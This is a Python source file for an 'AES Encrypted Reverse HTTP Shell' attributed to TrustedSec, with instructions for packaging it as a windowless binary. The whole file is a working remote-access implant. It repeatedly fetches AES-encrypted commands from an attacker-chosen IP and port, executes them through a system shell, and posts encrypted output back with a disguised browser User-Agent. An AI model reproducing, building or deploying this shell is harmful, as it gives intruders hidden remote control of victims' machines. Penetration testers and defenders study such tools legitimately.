#!/usr/bin/python
##########################################################################
#
#
#  AES Encrypted Reverse HTTP Shell by:
#
#         Dave Kennedy (ReL1K)
#      http://www.trustedsec.com
#
##########################################################################
#
##########################################################################
#
# To compile, you will need pyCrypto, it's a pain to install if you do it from source, should get the binary modules
# to make it easier. Can download from here:
# http://www.voidspace.org.uk/cgi-bin/voidspace/downman.py?file=pycrypto-2.0.1.win32-py2.5.zip
#
##########################################################################
#
# This shell works on any platform you want to compile it in. OSX, Windows, Linux, etc.
#
##########################################################################
#
##########################################################################
#
# Below is the steps used to compile the binary. py2exe requires a dll to be used in conjunction
# so py2exe was not used. Instead, pyinstaller was used in order to byte compile the binary.
#
##########################################################################
#
# export VERSIONER_PYTHON_PREFER_32_BIT=yes
# python Configure.py
# python Makespec.py --onefile --noconsole shell.py
# python Build.py shell/shell.spec
#
##########################################################################


import urllib
from Crypto.Cipher import AES
import sys
import os
import http.client
import subprocess
import base64
import time


# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32
# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'
# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# secret key, change this if you want to be unique
secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
# random junk
random = "sdfdsfdsdfsfd@#2$"
# create a cipher object using the random secret
cipher = AES.new(secret)

# TURN THIS ON IF YOU WANT PROXY SUPPORT
PROXY_SUPPORT = "OFF"
# THIS WILL BE THE PROXY URL
PROXY_URL = "http://proxystuff:80"
# USERNAME FOR THE PROXY
USERNAME = "username_here"
# PASSWORD FOR THE PROXY
PASSWORD = "password_here"

# here is where we set all of our proxy settings
if PROXY_SUPPORT == "ON":
    auth_handler = urllib.request.HTTPBasicAuthHandler()
    auth_handler.add_password(realm='RESTRICTED ACCESS', uri=PROXY_URL,
                              user=USERNAME, passwd=PASSWORD)
    opener = urllib.request.build_opener(auth_handler)
    urllib.request.install_opener(opener)

try:
    # our reverse listener ip address
    address = sys.argv[1]
    # our reverse listener port address
    port = sys.argv[2]

# except that we didn't pass parameters
except IndexError:
    print(" \nAES Encrypted Reverse HTTP Shell by:")
    print("        Dave Kennedy (ReL1K)")
    print("      http://www.trustedsec.com")
    print("Usage: shell.exe <reverse_ip_address> <rport>")
    time.sleep(0.1)
    sys.exit()

# loop forever
while 1:
    # open up our request handelr
    req = urllib.request.Request('http://%s:%s' % (address, port))
    # grab our response which contains what command we want
    message = urllib.request.urlopen(req)
    # base64 unencode
    message = base64.b64decode(message.read())
    # decrypt the communications
    message = DecodeAES(cipher, message)
    # quit out if we receive that command
    if message == "quit" or message == "exit":
        sys.exit()
    # issue the shell command we want
    message = message.replace("{", "")
    proc = subprocess.Popen(message, shell=True,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # read out the data of stdout
    data = proc.stdout.read() + proc.stderr.read()
    # encrypt the data
    data = EncodeAES(cipher, data)
    # base64 encode the data
    data = base64.b64encode(data)
    # urlencode the data from stdout
    data = urllib.parse.urlencode({'cmd': '%s'}) % (data)
    # who we want to connect back to with the shell
    h = http.client.HTTPConnection('%s:%s' % (address, port))
    # set our basic headers
    headers = {"User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
               "Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
    # actually post the data
    h.request('POST', '/index.aspx', data, headers)
